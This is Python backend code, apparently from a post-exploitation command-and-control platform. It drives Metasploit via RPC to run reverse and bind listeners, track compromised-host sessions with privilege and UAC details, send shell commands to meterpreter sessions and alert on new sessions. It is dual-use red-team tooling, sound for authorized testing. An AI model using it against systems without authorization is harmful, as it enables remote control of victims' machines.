        for req in reqs:
            # post python module
            if req.get("job_id") is None:
                req["moduleinfo"] = PostModuleSerializer(req.get("module"), many=False).data
                req["moduleinfo"]['_custom_param'] = Job._deal_dynamic_param(req["moduleinfo"]['_custom_param'])
                req.pop("module")  # 弹出module实例
                reqs_temp.append(req)
                continue

            # post msf module
            # 跳过任务检查
            if uncheck:
                req["moduleinfo"] = PostModuleSerializer(req.get("module"), many=False).data
                req.pop("module")  # 弹出module实例
                req["moduleinfo"]['_custom_param'] = Job._deal_dynamic_param(req["moduleinfo"]['_custom_param'])
                reqs_temp.append(req)
                continue
            elif msf_jobs_dict.get(str(req.get("job_id"))) is not None:
                req["moduleinfo"] = PostModuleSerializer(req.get("module"), many=False).data
                req["moduleinfo"]['_custom_param'] = Job._deal_dynamic_param(req["moduleinfo"]['_custom_param'])
                req.pop("module")  # 弹出module实例
                reqs_temp.append(req)
                continue
            else:
                # 清除失效的任务
                if int(time.time()) - req.get("time") >= 30:
                    logger.error(f"清除失效的任务: {req.get('module').NAME}")
                    logger.error(req)
                    Xcache.del_module_task_by_uuid(req.get("uuid"))
                else:
                    # 如果创建时间不足30秒,则等待callback处理数据
                    req["moduleinfo"] = PostModuleSerializer(req.get("module"), many=False).data
                    req["moduleinfo"]['_custom_param'] = Job._deal_dynamic_param(req["moduleinfo"]['_custom_param'])
                    req.pop("module")
                    reqs_temp.append(req)
                    continue
        return reqs_temp

    @staticmethod
    def _deal_dynamic_param(_custom_param=None):
        """处理handler及凭证等动态变化参数,返回处理后参数列表"""
        if _custom_param is None:
            return None
        import json
        if _custom_param.get(HANDLER_OPTION.get("name")) is not None:
            new_option = {}
            old_option = json.loads(_custom_param.get(HANDLER_OPTION.get("name")))
            new_option["PAYLOAD"] = old_option.get("PAYLOAD")
            new_option["LHOST"] = old_option.get("LHOST")
            new_option["RHOST"] = old_option.get("RHOST")
            new_option["LPORT"] = old_option.get("LPORT")
            _custom_param[HANDLER_OPTION.get("name")] = json.dumps(new_option)

        return _custom_param

    @staticmethod
    def list_bot_wait():
        bot_wait_show = {}
        reqs_temp = []
        reqs = Xcache.list_bot_wait()

        for req in reqs:
            req["moduleinfo"] = BotModuleSerializer(req.get("module"), many=False).data
            req.pop("module")  # 弹出module实例
            req_group_uuid = req.get("group_uuid")
            req_moduleinfo = req.get("moduleinfo")
            if bot_wait_show.get(req_group_uuid) is None:
                req_tmp = copy.deepcopy(req)
                req_tmp["ip_list"] = [req_moduleinfo.get("_ip")]
                bot_wait_show[req_group_uuid] = req_tmp
            else:
                bot_wait_show[req_group_uuid]["ip_list"].append(req_moduleinfo.get("_ip"))
        for group_uuid in bot_wait_show:
            reqs_temp.append(bot_wait_show.get(group_uuid))
        return reqs_temp

    @staticmethod
    def list_msfrpc_jobs_no_cache():
        infos = {}
        try:
            result = RpcClient.call(Method.JobList)
            Xcache.set_msf_job_cache(result)
            if result is None:
                infos = {}
            else:
                infos = result
        except Exception as E:
            logger.error(E)
        return infos

    @staticmethod
    def list_msfrpc_jobs():
        infos = Xcache.get_msf_job_cache()
        return infos

    @staticmethod
    def is_msf_job_alive(job_id):
        time.sleep(0.5)
        try:
            result = RpcClient.call(Method.JobList)
            Xcache.set_msf_job_cache(result)
            if result is None:
                return False
            else:
                if result.get(str(job_id)) is not None:
                    return True
                else:
                    return False
        except Exception as E:
            logger.error(E)
            return False

    @staticmethod
    def destroy_adv_job(task_uuid=None, job_id=None, broker=None):
        try:
            from PostModule.lib.ModuleTemplate import BROKER
            if broker == BROKER.post_python_job:
                flag = aps_module.delete_job_by_uuid(task_uuid)
                if flag is not True:
                    context = dict_data_return(304, Job_MSG.get(304), {})
                    return context
                else:
                    context = dict_data_return(204, Job_MSG.get(204), {"uuid": task_uuid, "job_id": job_id})
                    return context
            elif broker == BROKER.post_msf_job:
                req = Xcache.get_module_task_by_uuid(task_uuid=task_uuid)
                common_module_instance = req.get("module")
                Xcache.del_module_task_by_uuid(task_uuid)
                params = [job_id]
                result = RpcClient.call(Method.JobStop, params)
                if result is None:
                    context = dict_data_return(305, Job_MSG.get(305), {})
                    return context
                if result.get('result') == 'success':
                    # 发送通知
                    Notices.send_info(
                        "模块: {} {} 手动删除完成".format(common_module_instance.NAME, common_module_instance.target_str))
                    context = dict_data_return(204, Job_MSG.get(204), {"uuid": task_uuid, "job_id": job_id})
                    return context
                else:
                    context = dict_data_return(304, Job_MSG.get(304), {})
                    return context
            elif broker == BROKER.bot_msf_job:
                flag = Xcache.del_bot_wait_by_group_uuid(task_uuid)
                if flag is not True:
                    context = dict_data_return(304, Job_MSG.get(304), {})
                    return context
                else:
                    context = dict_data_return(204, Job_MSG.get(204), {"uuid": task_uuid})
                    return context
            else:
                context = dict_data_return(304, Job_MSG.get(304), {})
                return context

        except Exception as E:
            logger.error(E)
            context = dict_data_return(500, CODE_MSG.get(500), {})
            return context

    @staticmethod
    def destroy(id=None):
        try:
            params = [id]
            result = RpcClient.call(Method.JobStop, params)
            if result is None:
                return False
            if result.get('result') == 'success':
                return True
            else:
                return False
        except Exception as E:
            logger.error(E)
            return False


class Handler(object):
    """监听类"""

    def __init__(self):
        self.payload = None
        self.RHOST = None
        self.LHOST = None
        self.LPORT = None

    @staticmethod
    def list():
        handlers = Handler.list_handler()
        context = list_data_return(200, CODE_MSG.get(200), handlers)
        return context

    @staticmethod
    def list_handler():
        handlers = []
        infos = Job.list_msfrpc_jobs()
        if infos is None:
            return handlers
        for key in infos.keys():
            info = infos.get(key)
            jobid = int(key)
            if info.get('name') == 'Exploit: multi/handler':
                datastore = info.get('datastore')
                if datastore is not None:
                    one_handler = {'ID': jobid, 'PAYLOAD': None}
                    if datastore.get('PAYLOAD') is not None:
                        one_handler['PAYLOAD'] = datastore.get('PAYLOAD')

                    elif datastore.get('Payload') is not None:
                        one_handler['PAYLOAD'] = datastore.get('Payload')
                    elif datastore.get('payload') is not None:
                        one_handler['PAYLOAD'] = datastore.get('payload')

                    z = datastore.copy()
                    z.update(one_handler)
                    one_handler = z
                    handlers.append(one_handler)
        Xcache.set_cache_handlers(handlers)
        # 获取虚拟监听
        virtual_handlers = Xcache.get_virtual_handlers()
        handlers.extend(virtual_handlers)

        # 特殊参数处理
        for one_handler in handlers:
            if one_handler.get('StageEncoder') is not None and one_handler.get('StageEncoder') != '':
                one_handler['EnableStageEncoding'] = True

        return handlers

    @staticmethod
    def list_handler_config():
        handlers = Handler.list_handler()
        tmp_enum_list = []
        for handler in handlers:
            import json
            lhost_str = ""
            rhost_srt = ""

            if handler.get('LHOST') is None:
                try:
                    handler.pop('LHOST')
                except Exception as _:
                    pass

            else:
                lhost_str = "LHOST:{} | ".format(handler.get('LHOST'))
            if handler.get('RHOST') is None:
                try:
                    handler.pop('RHOST')
                except Exception as _:
                    pass
            else:
                rhost_srt = "RHOST:{} | ".format(handler.get('RHOST'))

            # 虚拟监听与真实监听标签
            if handler.get("ID") < 0:
                handlertag = "虚拟 | "
            else:
                handlertag = ""

            if handler.get("HandlerName") is None:
                name = f"{handlertag}{handler.get('PAYLOAD')} | {lhost_str}{rhost_srt} LPORT:{handler.get('LPORT')}"
            else:
                name = f"{handlertag}{handler.get('HandlerName')} | {handler.get('PAYLOAD')} | {lhost_str}{rhost_srt} LPORT:{handler.get('LPORT')}"

            value = json.dumps(handler)
            tmp_enum_list.append({'name': name, 'value': value})
        return tmp_enum_list

    @staticmethod
    def recovery_cache_last_handler(cache_handlers):
        for one_handler in cache_handlers:
            opts = one_handler
            connext = Handler.create(opts)
            code = connext.get("code")
            payload = opts.get('PAYLOAD')
            port = opts.get('LPORT')
            if code == 201:
                Notices.send_info(f"历史监听 Payload:{payload} Port:{port} 加载成功")
            elif code in [301]:
                Notices.send_warning(f"历史监听 Payload:{payload} Port:{port} 加载失败")
            else:
                Notices.send_warning(f"历史监听 Payload:{payload} Port:{port} 加载失败,未知的返回值：f{code}")

        Notices.send_info("所有历史监听加载完成")

    @staticmethod
    def create(opts=None):
        # 所有的参数必须大写
        # opts = {'PAYLOAD': payload, 'LHOST': LHOST, 'LPORT': LPORT, 'RHOST': RHOST}
        if opts.get('VIRTUALHANDLER') is True:  # 虚拟监听
            opts.pop('VIRTUALHANDLER')
            result = Handler.create_virtual_handler(opts)
            if result is None:
                opts['ID'] = None
                context = dict_data_return(301, Handler_MSG.get(301), opts)
            else:
                context = dict_data_return(201, Handler_MSG.get(201), {})
        else:
            # 真正的监听
            # 处理代理相关参数
            if opts.get("proxies_proto") == "Direct" or opts.get("proxies_proto") is None:
                try:
                    opts.pop('proxies_proto')
                except Exception as _:
                    pass
                try:
                    opts.pop('proxies_ipport')
                except Exception as _:
                    pass

            else:
                proxies_proto = opts.get('proxies_proto')
                proxies_ipport = opts.get('proxies_ipport')
                opts["proxies"] = f"{proxies_proto}:{proxies_ipport}"
                try:
                    opts.pop('proxies_proto')
                except Exception as _:
                    pass
                try:
                    opts.pop('proxies_ipport')
                except Exception as _:
                    pass
            try:
                if opts.get('PAYLOAD').find("reverse") > 0:
                    try:
                        opts.pop('RHOST')
                    except Exception as _:
                        pass

                    # 查看端口是否已占用
                    # lport = int(opts.get('LPORT'))
                    # flag, lportsstr = is_empty_ports(lport)
                    # if flag is not True:
                    #     context = dict_data_return(306, Handler_MSG.get(306), {})
                    #     return context

                elif opts.get('PAYLOAD').find("bind") > 0:
                    if opts.get('LHOST') is not None:
                        opts.pop('LHOST')
                # 反向http(s)服务常驻问题特殊处理
                if opts.get('PAYLOAD').find("reverse_http") or opts.get('PAYLOAD').find("reverse_winhttp"):
                    opts['EXITONSESSION'] = False
                    opts['KillHandlerFouce'] = True
                else:
                    if opts.get('EXITONSESSION'):
                        opts['EXITONSESSION'] = True
                    else:
                        opts['EXITONSESSION'] = False
                opts['PayloadUUIDSeed'] = str(uuid.uuid1())
            except Exception as E:
                logger.error(E)
                context = dict_data_return(500, CODE_MSG.get(500), {})
                return context

            result = MSFModule.run(module_type="exploit", mname="multi/handler", opts=opts, runasjob=True)

            if isinstance(result, dict) is not True or result.get('job_id') is None:
                opts['ID'] = None
                context = dict_data_return(301, Handler_MSG.get(301), opts)
            else:
                job_id = int(result.get('job_id'))
                if Job.is_msf_job_alive(job_id):
                    opts['ID'] = int(result.get('job_id'))
                    Notices.send_success("新建监听成功:{} {} JobID:{}".format(opts.get('PAYLOAD'), opts.get('LPORT'),
                                                                        result.get('job_id')))
                    context = dict_data_return(201, Handler_MSG.get(201), opts)
                else:
                    context = dict_data_return(301, Handler_MSG.get(301), opts)

        return context

    @staticmethod
    def destroy(id=None):
        if id is None:
            context = dict_data_return(303, Handler_MSG.get(303), {})
            return context
        else:
            if -10000 < id < 0:  # 虚拟监听
                flag_result = Xcache.del_virtual_handler(id)
                if flag_result:
                    context = dict_data_return(202, Handler_MSG.get(202), {})
                else:
                    context = dict_data_return(303, Handler_MSG.get(303), {})
            else:
                flag = Job.destroy(id)
                if flag:
                    # 删除msf监听
                    if Job.is_msf_job_alive(id):
                        context = dict_data_return(303, Handler_MSG.get(303), {})
                    else:
                        context = dict_data_return(202, Handler_MSG.get(202), {})
                else:
                    context = dict_data_return(303, Handler_MSG.get(303), {})
            return context

    @staticmethod
    def create_virtual_handler(opts=None):
        """生成一个虚拟监听"""
        one_handler = opts
        virtual_id = Xcache.add_virtual_handler(one_handler)

        opts['ID'] = virtual_id
        return opts

    # @staticmethod
    # def get_license():
    #     pub_key_path = os.path.join(settings.BASE_DIR, "STATICFILES/STATIC/rsa_public_key.pub")
    #     if os.path.exists(LICENSEFILE):
    #         with open(LICENSEFILE, 'r') as f:
    #             get2user = f.read()
    #     else:
    #         return {"user": None, "timestamp": 0}
    #
    #     with open(pub_key_path, 'r') as f:
    #         publicKey = rsa.PublicKey.load_pkcs1_openssl_pem(f.read().encode())
    #     message = json.loads(base64.b64decode(get2user)).get("data").encode("utf-8")
    #     signature = base64.b64decode(json.loads(base64.b64decode(get2user)).get("signature"))
    #     try:
    #         result = rsa.verify(message, signature, publicKey)
    #         return json.loads(message)
    #     except Exception as E:
    #         return {"user": None, "timestamp": 0}


class Session(object):
    """session信息"""

    @staticmethod
    def list(sessionid=None):
        if sessionid is None or sessionid <= 0:
            context = dict_data_return(304, Session_MSG.get(304), {})
            return context
        session_interface = SessionLib(sessionid, rightinfo=True, uacinfo=True, pinfo=True)
        result = SessionLibSerializer(session_interface).data
        context = dict_data_return(200, CODE_MSG.get(200), result)
        return context

    @staticmethod
    def update(sessionid=None):
        if sessionid is None or sessionid <= 0:
            context = dict_data_return(304, Session_MSG.get(304), {})
            return context
        Xcache.set_session_info(sessionid, None)
        session_lib = SessionLib(sessionid, rightinfo=True, uacinfo=True, pinfo=True)
        result = SessionLibSerializer(session_lib).data
        context = dict_data_return(203, Session_MSG.get(203), result)
        return context

    @staticmethod
    def destroy(sessionid=None):
        if sessionid is None or sessionid <= 0:
            context = dict_data_return(304, Session_MSG.get(304), {})
            return context
        else:
            params = [sessionid]
            try:
                result = RpcClient.call(Method.SessionStop, params, timeout=12)
                if result is None:  # 删除超时
                    Notices.send_success(f"{Session_MSG.get(202)} SID: {sessionid}")
                    context = dict_data_return(202, Session_MSG.get(202), {})
                    return context
                elif result.get('result') == 'success':
                    Notices.send_success(f"{Session_MSG.get(201)} SID: {sessionid}")
                    context = dict_data_return(201, Session_MSG.get(201), {})
                    return context
                else:
                    Notices.send_warning(f"{Session_MSG.get(301)} SID: {sessionid}")
                    context = dict_data_return(301, Session_MSG.get(301), {})
                    return context
            except Exception as E:
                logger.error(E)
                Notices.send_warning(f"{Session_MSG.get(301)} SID: {sessionid}")
                context = dict_data_return(301, Session_MSG.get(301), {})
                return context

    @staticmethod
    def get_session(sessionid):
        info = RpcClient.call(Method.SessionGet, [sessionid], timeout=3)
        if info is not None:

            one_session = {'id': sessionid}
            # 处理linux的no-user问题
            if str(info.get('info')).split(' @ ')[0] == "no-user":
                info['info'] = info.get('info')[10:]

            try:
                one_session['user'] = str(info.get('info')).split(' @ ')[0]
                one_session['computer'] = str(info.get('info')).split(' @ ')[1]
            except Exception as _:
                one_session['user'] = "Initializing"
                one_session['computer'] = "Initializing"
                one_session['type'] = info.get('type')
                one_session['session_host'] = info.get('session_host')
                one_session['tunnel_local'] = info.get('tunnel_local')
                one_session['tunnel_peer'] = info.get('tunnel_peer')
                one_session['via_exploit'] = info.get('via_exploit')
                one_session['via_payload'] = info.get('via_payload')
                one_session['info'] = info.get('info')
                one_session['arch'] = info.get('arch')
                one_session['platform'] = info.get('platform')
                one_session['last_checkin'] = info.get('last_checkin') // 10 * 10
                one_session['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
                one_session['advanced_info'] = {"sysinfo": {}, "username": "Initializing"}
                one_session['os'] = None
                one_session['os_short'] = None
                one_session['load_powershell'] = False
                one_session['load_python'] = False
                one_session['uuid'] = info.get('uuid')
                one_session['routes'] = []
                one_session['isadmin'] = False
                one_session['available'] = False  # 是否初始化完成
                return one_session
            else:
                one_session['type'] = info.get('type')
                one_session['session_host'] = info.get('session_host')
                one_session['tunnel_local'] = info.get('tunnel_local')
                one_session['tunnel_peer'] = info.get('tunnel_peer')
                one_session['tunnel_peer_ip'] = info.get('tunnel_peer').split(":")[0]
                one_session['tunnel_peer_locate'] = Geoip.get_city(info.get('tunnel_peer').split(":")[0])
                one_session['via_exploit'] = info.get('via_exploit')
                one_session['via_payload'] = info.get('via_payload')
                one_session['info'] = info.get('info')
                one_session['arch'] = info.get('arch')
                one_session['platform'] = info.get('platform')
                one_session['last_checkin'] = info.get('last_checkin') // 10 * 10
                one_session['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
                one_session['advanced_info'] = info.get('advanced_info')
                try:
                    one_session['os'] = info.get('advanced_info').get("sysinfo").get("OS")
                    one_session['os_short'] = info.get('advanced_info').get("sysinfo").get("OS").split("(")[0]
                except Exception as _:
                    one_session['os'] = None
                    one_session['os_short'] = None
                one_session['load_powershell'] = info.get('load_powershell')
                one_session['load_python'] = info.get('load_python')
                one_session['uuid'] = info.get('uuid')
                try:
                    one_session['isadmin'] = info.get('advanced_info').get("sysinfo").get("IsAdmin")
                except Exception as _:
                    one_session['isadmin'] = None

                routestrlist = info.get('routes')
                try:
                    one_session['routes'] = []
                    if isinstance(routestrlist, list):
                        for routestr in routestrlist:
                            routestr.split('/')
                            tmpdict = {"subnet": routestr.split('/')[0], 'netmask': routestr.split('/')[1]}
                            one_session['routes'].append(tmpdict)
                except Exception as E:
                    logger.error(E)
                one_session['available'] = True
                return one_session
        else:
            return None

    @staticmethod
    def list_sessions():
        sessions_available_count = 0
        sessions = []
        infos = RpcClient.call(Method.SessionList, timeout=3)
        if infos is None:
            return sessions

        if infos.get('error'):
            logger.warning(infos.get('error_string'))
            return sessions
        sessionhosts = []
        for key in infos.keys():
            info = infos.get(key)
            if info is not None:
                one_session = {}
                try:
                    one_session['id'] = int(key)
                except Exception as E:
                    logger.warning(E)
                    continue
                # 处理linux的no-user问题
                if str(info.get('info')).split(' @ ')[0] == "no-user":
                    info['info'] = info.get('info')[10:]

                try:
                    one_session['user'] = str(info.get('info')).split(' @ ')[0]
                    one_session['computer'] = str(info.get('info')).split(' @ ')[1]
                except Exception as _:
                    one_session['user'] = "Initializing"
                    one_session['computer'] = "Initializing"
                    one_session['type'] = info.get('type')
                    one_session['session_host'] = info.get('session_host')
                    sessionhosts.append(info.get('session_host'))
                    one_session['tunnel_local'] = info.get('tunnel_local')
                    one_session['tunnel_peer'] = info.get('tunnel_peer')
                    one_session['via_exploit'] = info.get('via_exploit')
                    one_session['via_payload'] = info.get('via_payload')
                    one_session['info'] = info.get('info')
                    one_session['arch'] = info.get('arch')
                    one_session['platform'] = info.get('platform')
                    one_session['last_checkin'] = info.get('last_checkin') // 10 * 10
                    one_session['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
                    one_session['advanced_info'] = {"sysinfo": {}, "username": "Initializing"}
                    one_session['os'] = None
                    one_session['load_powershell'] = False
                    one_session['load_python'] = False
                    one_session['uuid'] = info.get('uuid')
                    one_session['routes'] = []
                    one_session['isadmin'] = False
                    one_session['available'] = False  # 是否初始化完成
                    sessions.append(one_session)
                    continue
                one_session['type'] = info.get('type')
                one_session['session_host'] = info.get('session_host')
                sessionhosts.append(info.get('session_host'))
                one_session['tunnel_local'] = info.get('tunnel_local')
                one_session['tunnel_peer'] = info.get('tunnel_peer')
                one_session['tunnel_peer_ip'] = info.get('tunnel_peer').split(":")[0]
                one_session['tunnel_peer_locate'] = Geoip.get_city(info.get('tunnel_peer').split(":")[0])
                one_session['via_exploit'] = info.get('via_exploit')
                one_session['via_payload'] = info.get('via_payload')
                one_session['info'] = info.get('info')
                one_session['arch'] = info.get('arch')
                one_session['platform'] = info.get('platform')
                one_session['last_checkin'] = info.get('last_checkin') // 10 * 10
                one_session['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
                one_session['advanced_info'] = info.get('advanced_info')
                try:
                    one_session['os'] = info.get('advanced_info').get("sysinfo").get("OS")
                    one_session['os_short'] = info.get('advanced_info').get("sysinfo").get("OS").split("(")[0]
                except Exception as _:
                    one_session['os'] = None
                    one_session['os_short'] = None
                one_session['load_powershell'] = info.get('load_powershell')
                one_session['load_python'] = info.get('load_python')
                one_session['uuid'] = info.get('uuid')
                try:
                    one_session['isadmin'] = info.get('advanced_info').get("sysinfo").get("IsAdmin")

                    if info.get('platform').lower().startswith('linux'):
                        if "uid=0" in one_session['info'].lower():
                            one_session['isadmin'] = True
                except Exception as _:
                    one_session['isadmin'] = None

                routestrlist = info.get('routes')

                try:
                    one_session['routes'] = []
                    if isinstance(routestrlist, list):
                        for routestr in routestrlist:
                            routestr.split('/')
                            tmpdict = {"subnet": routestr.split('/')[0], 'netmask': routestr.split('/')[1]}
                            one_session['routes'].append(tmpdict)
                except Exception as E:
                    logger.error(E)
                one_session['available'] = True
                sessions_available_count += 1
                sessions.append(one_session)

        def split_ip(ip):
            try:
                result = tuple(int(part) for part in ip.split('.'))
            except Exception as E:
                logger.exception(E)
                return 0, 0, 0
            return result

        def session_host_key(item):
            return split_ip(item.get("session_host"))

        sessions = sorted(sessions, key=session_host_key)

        # session监控功能
        if Xcache.get_sessionmonitor_conf().get("flag"):
            if Xcache.get_session_count() < sessions_available_count:
                Notices.send_sms(f"当前Session数量: {sessions_available_count} IP列表: {','.join(sessionhosts)}")
                Notices.send_info(f"当前Session数量: {sessions_available_count}")
            if Xcache.get_session_count() != sessions_available_count:
                Xcache.set_session_count(sessions_available_count)
        return sessions

    @staticmethod
    def destroy_session(session_id=None):
        if session_id is None:
            return False
        else:
            params = [session_id]
            try:
                result = RpcClient.call(Method.SessionStop, params)
                if result is None:
                    return False
                if result.get('result') == 'success':
                    return True
                else:
                    return False
            except Exception as E:
                logger.error(E)
                return False


class SessionLib(object):
    """收集session的基本信息,用于Session和postmodule的lib"""
    SID_TO_INTEGERITY_LEVEL = {
        'S-1-16-4096': 'low',
        'S-1-16-8192': 'medium',
        'S-1-16-12288': 'high',
        'S-1-16-16384': 'system'
    }
    UAC_NO_PROMPT = 0
    UAC_PROMPT_CREDS_IF_SECURE_DESKTOP = 1
    UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP = 2
    UAC_PROMPT_CREDS = 3
    UAC_PROMPT_CONSENT = 4
    UAC_DEFAULT = 5

    def __init__(self, sessionid=None, rightinfo=False, uacinfo=False, pinfo=False):
        self._rightinfo = rightinfo  # uac开关,uac登记 TEMP目录
        self._uacinfo = uacinfo  # 管理员组 完整性
        self._pinfo = pinfo  # 进程相关嘻嘻
        self.sessionid = sessionid
        self._session_uuid = None
        self.update_time = 0

        # RIGHTINFO
        self.is_in_admin_group = None
        self.is_admin = None
        self.tmpdir = None

        # UACINFO
        self.is_uac_enable = None
        self.uac_level = -1
        self.integrity = None

        # PINFO
        self.pid = -1
        self.pname = None
        self.ppath = None
        self.puser = None
        self.parch = None
        self.processes = []

        # 基本信息
        self.load_powershell = False
        self.load_python = False
        self.domain = None
        self.session_host = None
        self.type = None
        self.computer = None
        self.arch = None
        self.platform = None
        self.last_checkin = 0
        self.user = None
        self.os = None
        self.os_short = None
        self.logged_on_users = 0
        self.tunnel_local = None
        self.tunnel_peer = None
        self.tunnel_peer_ip = None
        self.tunnel_peer_locate = None
        self.tunnel_peer_asn = None
        self.via_exploit = None
        self.via_payload = None
        self.route = []
        self._init_info()

    def _init_info(self):
        """初始化session信息"""
        # 更新基本信息
        self._set_base_info()
        # 是否需要拓展的信息
        if self._rightinfo or self._pinfo or self._uacinfo:
            cache_result = Xcache.get_session_info(self.sessionid)
            if cache_result is None:
                module_type = "post"
                mname = "multi/gather/session_info"
                opts = {'SESSION': self.sessionid, 'PINFO': self._pinfo, 'RIGHTINFO': self._rightinfo,
                        'UACINFO': self._uacinfo}
                result = MSFModule.run(module_type=module_type, mname=mname, opts=opts, timeout=30)
            else:
                result = cache_result
            if result is None:
                Notices.send_warning("更新Session信息,请稍后重试".format(result))
                return
            try:
                result_dict = json.loads(result)
                self._set_advanced_info(result_dict)
                if self._rightinfo and self._pinfo and self._uacinfo:
                    result_dict["update_time"] = int(time.time())
                    Xcache.set_session_info(self.sessionid, json.dumps(result_dict))
            except Exception as E:
                logger.warning(E)
                logger.warning("更新Session信息失败,返回消息为{}".format(result))
                Notices.send_warning("更新Session信息失败,请稍后重试".format(result))

    def _set_base_info(self):
        one = Session.get_session(self.sessionid)
        if one is None:
            return False
        try:
            self.session_host = one.get('session_host')
            self.type = one.get('type')
            self.tunnel_local = one.get('tunnel_local')
            self.tunnel_peer = one.get('tunnel_peer')
            # 解析信息
            self.tunnel_peer_ip = one.get('tunnel_peer').split(":")[0]
            self.tunnel_peer_locate = Geoip.get_city(one.get('tunnel_peer').split(":")[0])
            self.tunnel_peer_asn = Geoip.get_asn(one.get('tunnel_peer').split(":")[0])

            self.via_exploit = one.get('via_exploit')
            self.via_payload = one.get('via_payload')
            self.last_checkin = one.get('last_checkin')
            self.fromnow = int(time.time()) - one.get('last_checkin')
            self.is_admin = one.get('isadmin')
            self.load_powershell = one.get('load_powershell')
            self.load_python = one.get('load_python')
            self.domain = one.get('advanced_info').get("sysinfo").get("Domain")
            self.os = one.get('advanced_info').get("sysinfo").get("OS")

            try:
                self.os_short = one.get('advanced_info').get("sysinfo").get("OS").split("(")[0]
                if len(self.os_short) > 18:
                    self.os_short = f"{self.os_short[0:6]} ... {self.os_short[-6:]}"
            except Exception as _:
                self.os_short = None

            self.logged_on_users = one.get('advanced_info').get("sysinfo").get("Logged On Users")
            self.computer = one.get('computer')
            self.arch = one.get('arch')
            self.platform = one.get('platform')
            self.user = one.get('user')
            self._session_uuid = one.get('uuid')
        except Exception as E:
            logger.warning(E)

    def _set_advanced_info(self, result_dict=None):
        try:
            if result_dict.get('status'):
                self.is_in_admin_group = result_dict.get('data').get('IS_IN_ADMIN_GROUP')
                # self.is_admin = result_dict.get('data').get('IS_ADMIN')
                self.tmpdir = result_dict.get('data').get('TEMP')
                self.is_uac_enable = result_dict.get('data').get('IS_UAC_ENABLE')
                self.uac_level = result_dict.get('data').get('UAC_LEVEL')
                if self.uac_level is None:
                    self.uac_level = -1
                self.integrity = self.SID_TO_INTEGERITY_LEVEL.get(result_dict.get('data').get('INTEGRITY'))
                self.pid = result_dict.get('data').get('PID')
                self.pname = result_dict.get('data').get('PNAME')
                self.ppath = result_dict.get('data').get('PPATH')
                self.puser = result_dict.get('data').get('PUSER')
                self.parch = result_dict.get('data').get('PARCH')
                self.processes = result_dict.get('data').get('PROCESSES')
                self.update_time = result_dict.get('update_time')
            else:
                logger.warning("模块执行错误")
        except Exception as E:
            logger.warning(E)

    @property
    def is_alive(self):
        """session是否可用"""
        if int(time.time()) - self.last_checkin > 60 and self.user is None:
            return False
        else:
            return True

    @property
    def is_system(self):
        """session是否可用"""
        if self.user == 'NT AUTHORITY\\SYSTEM' or self.user == "root":
            return True
        else:
            return False

    @property
    def is_in_domain(self):
        if self.platform == "windows":
            if self.user is not None:
                try:
                    session_domain = self.user.split('\\')[0]
                    if session_domain.lower() == self.domain.lower():
                        return True
                    if session_domain.lower() == self.computer.lower():
                        return False
                    if session_domain.lower() == "nt authority":  # system权限默认在域中
                        return True
                    return False
                except Exception as E:
                    logger.warning(E)
                    return False
        else:
            return False

    @property
    def is_windows(self):
        if self.platform is None:
            return False
        elif self.platform.lower().startswith('window'):
            return True
        else:
            return False

    @property
    def is_linux(self):
        if self.platform is None:
            return False
        elif self.platform.lower().startswith('linux'):
            return True
        else:
            return False


class SessionIO(object):

    @staticmethod
    def create(hid=None, sessionid=None, user_input=None):
        try:
            user_input = user_input.strip()

            if user_input.startswith('shell'):
                command = user_input[len('shell'):]
                if len(command) == 0:
                    new_bufer = "\n{}\n".format(
                        "Not support switch to Dos/Bash,input like\"shell whoami\" to run os cmd.")
                    result = Xcache.add_sessionio_cache(hid, new_bufer)

                    context = dict_data_return(200, SessionIO_MSG.get(200), result)
                    return context
                else:
                    user_input = f"shell -c '{command}'"

            if user_input.startswith('exit'):
                params = [sessionid]
                result = RpcClient.call(Method.SessionMeterpreterSessionKill, params)

                context = dict_data_return(203, SessionIO_MSG.get(203), result)
                return context

            params = [sessionid, user_input]
            result = RpcClient.call(Method.SessionMeterpreterWrite, params)
            if result is None:
                context = dict_data_return(305, SessionIO_MSG.get(305), {})
            elif result.get('result') == 'success':
                new_bufer = "{}{}\n".format(METERPRETER_PROMPT, user_input)
                result = Xcache.add_sessionio_cache(hid, new_bufer)
                context = dict_data_return(200, SessionIO_MSG.get(200), result)
            else:
                context = dict_data_return(305, SessionIO_MSG.get(305), {})
        except Exception as E:
            logger.error(E)
            context = dict_data_return(306, SessionIO_MSG.get(306), {})
        return context

    @staticmethod
    def update(hid=None, sessionid=None):
        old_result = Xcache.get_sessionio_cache(hid)
        if sessionid is None or sessionid == -1:
            context = dict_data_return(202, SessionIO_MSG.get(202), old_result)
            return context
        try:
            params = [sessionid]
            result = RpcClient.call(Method.SessionMeterpreterRead, params)
            if result is None or (isinstance(result, dict) is not True):
                context = dict_data_return(303, SessionIO_MSG.get(303), old_result)
                return context
            new_bufer = result.get('data')
            result = Xcache.add_sessionio_cache(hid, new_bufer)
            context = dict_data_return(200, CODE_MSG.get(200), result)  # code特殊处理
        except Exception as E:
            logger.error(E)
            context = dict_data_return(306, SessionIO_MSG.get(405), old_result)
        return context

    @staticmethod
    def destroy(hid=None):
        """清空历史记录"""
        result = Xcache.del_sessionio_cache(hid)
        context = dict_data_return(204, SessionIO_MSG.get(204), result)
        return context


class Console(object):
    def __init__(self):
        pass

    @staticmethod
    def get_active_console():
        result = RpcClient.call(Method.ConsoleList, [])
        if result is None:
            Xcache.set_console_id(None)
            return False
        else:
            consoles = result.get("consoles")
            if len(consoles) == 0:
                consoles_create_opt = {"SkipDatabaseInit": True, 'AllowCommandPassthru': False}
                result = RpcClient.call(Method.ConsoleCreate, [consoles_create_opt])
                if result is None:
                    Xcache.set_console_id(None)
                    return False
                else:
                    active_id = int(result.get("id"))
                    Xcache.set_console_id(active_id)
                    return True
            else:
                active_id = int(consoles[0].get("id"))
                Xcache.set_console_id(active_id)
                return True

    @staticmethod
    def reset_active_console():
        result = RpcClient.call(Method.ConsoleList, [])
        if result is None:
            Xcache.set_console_id(None)
        else:
            consoles = result.get("consoles")
            if len(consoles) == 0:
                pass
            else:
                for console in consoles:  # 删除已知命令行
                    cid = int(console.get("id"))
                    params = [cid]
                    RpcClient.call(Method.ConsoleDestroy, params)
            result = RpcClient.call(Method.ConsoleCreate)
            if result is None:
                Xcache.set_console_id(None)
            else:
                active_id = int(result.get("id"))
                Xcache.set_console_id(active_id)

    @staticmethod
